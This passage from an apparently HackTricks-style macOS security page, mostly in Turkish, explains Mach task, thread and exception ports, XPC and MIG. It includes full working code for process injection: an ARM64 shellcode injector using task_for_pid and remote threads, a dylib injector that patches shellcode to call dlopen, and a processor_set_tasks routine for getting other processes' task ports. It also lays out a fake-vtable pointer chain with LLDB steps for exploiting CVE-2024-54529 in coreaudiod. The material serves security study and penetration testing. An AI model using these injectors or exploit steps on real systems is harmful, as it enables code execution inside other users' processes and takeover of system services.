**Kernel'in de bir task** olduğunu unutmayın; birisi **`kernel_task`** üzerinde **SEND permissions** elde ederse kernel'e herhangi bir şeyi çalıştırabilir (jailbreaks).

- Caller task için bu port'un **name**'ini almak üzere `mach_task_self()` çağrılır. Bu port yalnızca **`exec()`** sırasında **inherit** edilir; `fork()` ile oluşturulan yeni bir task yeni bir task port'u alır (özel bir durum olarak, bir task suid binary üzerinde `exec()` sonrasında da yeni bir task port'u alır). Bir task oluşturup port'unu almanın tek yolu, `fork()` sırasında ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) gerçekleştirmektir.
- Porta erişim kısıtlamaları şunlardır (`AppleMobileFileIntegrity` binary'sindeki `macos_task_policy` kaynağından):
- Uygulamanın **`com.apple.security.get-task-allow` entitlement**'ı varsa, **aynı user**'a ait process'ler task port'una erişebilir (debugging için Xcode tarafından yaygın olarak eklenir). **Notarization** process'i production release'lerinde buna izin vermez.
- **`com.apple.system-task-ports`** entitlement'ına sahip uygulamalar kernel hariç **herhangi bir** process için **task port** alabilir. Eski versiyonlarda bunun adı **`task_for_pid-allow`** idi. Bu yalnızca Apple uygulamalarına verilir.
- **Root**, **hardened** runtime ile derlenmemiş (ve Apple'a ait olmayan) uygulamaların task port'larına erişebilir.

**The task name port:** _task port_'un ayrıcalıksız bir versiyonudur. Task'e referans verir ancak onu kontrol etmeye izin vermez. Bunun üzerinden kullanılabilir görünen tek şey `task_info()`'dur.

### Thread Ports

Thread'lerin de ilişkili port'ları vardır. Bunlar `task_threads` çağrısını yapan task'ten ve `processor_set_threads` ile processor'dan görülebilir. Thread port üzerinde SEND right bulunması, `thread_act` subsystem'inin function'larının kullanılmasına izin verir; örneğin:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Her thread bu port'u `mach_thread_sef` çağrısıyla alabilir.

### Shellcode Injection in thread via Task port

Şuradan bir shellcode alabilirsiniz:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compile** önceki programı ve aynı kullanıcıyla code inject edebilmek için **entitlements** ekleyin (aksi halde **sudo** kullanmanız gerekir).<sup>[3]</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Bunun iOS'ta çalışması için, yazılabilir bir memory'yi executable hâle getirebilmek amacıyla `dynamic-codesigning` entitlement'ına ihtiyacınız vardır.

### Task port üzerinden thread'e Dylib Injection

macOS'ta **thread'ler**, **Mach** veya posix `pthread` api kullanılarak manipüle edilebilir. Önceki injection işleminde oluşturduğumuz thread, Mach api kullanılarak oluşturulmuştu; bu nedenle **posix uyumlu değildir**.

**Basit bir shellcode'u** bir command çalıştıracak şekilde **inject etmek** mümkündü; çünkü bunun posix uyumlu api'lerle çalışması gerekmiyor, yalnızca Mach yeterli oluyordu. **Daha karmaşık injection'lar** için **thread'in** aynı zamanda **posix uyumlu** olması gerekir.

Bu nedenle, **thread'i geliştirmek** için `pthread_create_from_mach_thread` çağrılmalıdır; bu fonksiyon **geçerli bir pthread** oluşturur. Ardından bu yeni pthread, sistemden bir **dylib yüklemek** için **dlopen** çağırabilir. Böylece farklı işlemler gerçekleştirmek üzere yeni shellcode yazmak yerine özel kütüphaneler yüklenebilir.<sup>[2]</sup>

**Örnek dylib'leri** burada bulabilirsiniz (örneğin bir log oluşturan ve ardından bunu dinleyebileceğiniz dylib):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Task port üzerinden Thread Hijacking <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Bu teknikte process içindeki bir thread ele geçirilir:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

`task_for_pid` veya `thread_create_*` çağrıldığında, kernel içindeki `task` struct'ında bir sayaç artırılır. Bu sayaç, user mode'dan `task_info(task, TASK_EXTMOD_INFO, ...)` çağrılarak erişilebilir.

## Exception Ports

Bir thread'de exception oluştuğunda, bu exception thread'in belirlenmiş exception port'una gönderilir. Thread bunu handle etmezse task'in exception port'larına gönderilir. Task bunu da handle etmezse, launchd tarafından yönetilen host port'una gönderilir ve burada acknowledge edilir. Buna exception triage denir.

Genellikle rapor düzgün şekilde handle edilmezse en sonunda ReportCrash daemon'ı tarafından handle edilir. Ancak aynı task içindeki başka bir thread'in exception'ı yönetmesi mümkündür; `PLCreashReporter` gibi crash reporting araçları bunu yapar.

## Diğer Nesneler

### Clock

Herhangi bir user, clock hakkında bilgiye erişebilir; ancak zamanı ayarlamak veya diğer ayarları değiştirmek için root olmak gerekir.

Bilgi almak için `clock` subsystem içindeki `clock_get_time`, `clock_get_attributtes` veya `clock_alarm` gibi function'lar çağrılabilir.\
Değerleri değiştirmek için `clock_priv` subsystem'i `clock_set_time` ve `clock_set_attributes` gibi function'larla kullanılabilir.

### Processor'lar ve Processor Set

Processor API'leri, `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment` gibi function'ları çağırarak tek bir logical processor'ı kontrol etmeye olanak tanır.

Ayrıca **processor set** API'leri, birden fazla processor'ı bir grup altında toplama olanağı sağlar. **`processor_set_default`** çağrılarak default processor set alınabilir.\
Processor set ile etkileşim kurmak için bazı ilgi çekici API'ler şunlardır:

- `processor_set_statistics`
- `processor_set_tasks`: Processor set içindeki tüm task'lere ait send right'ların bir array'ini döndürür
- `processor_set_threads`: Processor set içindeki tüm thread'lere ait send right'ların bir array'ini döndürür
- `processor_set_stack_usage`
- `processor_set_info`

[**Bu gönderide**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) belirtildiği üzere, geçmişte bu durum, daha önce bahsedilen korumayı bypass ederek diğer process'lerdeki task port'larını almayı ve **`processor_set_tasks`** çağırarak ve her process üzerinde bir host port elde ederek bu process'leri kontrol etmeyi mümkün kılıyordu.\
Günümüzde bu function'ı kullanmak için root gerekir ve bu işlev korumalıdır; dolayısıyla bu port'ları yalnızca korumasız process'ler üzerinde alabilirsiniz.<sup>[11]</sup>

Şu şekilde deneyebilirsiniz:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[10]</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; vtable slotu üzerinden indirect call
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)
- [7] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [8] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [9] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [10] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [11] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
